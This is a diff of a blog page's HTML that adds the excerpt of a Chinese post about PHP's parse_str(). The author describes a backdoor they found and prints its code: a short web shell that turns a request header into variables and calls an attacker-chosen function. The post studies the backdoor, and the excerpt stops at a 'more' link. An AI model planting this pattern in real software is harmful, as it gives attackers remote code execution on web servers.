@@ -153,7 +153,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/04/PHP-parse-str/">PHP_parse_str</a>
+      <a class="article-title" href="/2018/03/04/PHP-parse-str/">PHP函数之parse_str()</a>
     </h1>
   
 
@@ -166,6 +166,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
+        <p>今天看到一个后门，自己看了一会儿并没有认出怎么用，后来查找资料复现执行了一下，记录一下：</p>
+<p>后门是这样的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span> php</span></span><br><span class="line"><span class="php">$opt_x = $_SERVER[<span class="string">'HTTP_X'</span>]; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($opt_x)&gt;<span class="number">20</span>) &#123; </span></span><br><span class="line"><span class="php">	parse_str($opt_x); </span></span><br><span class="line"><span class="php">	$cfg($opt); </span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2018/03/04/PHP-parse-str/#more">more >></a>
         
       
 
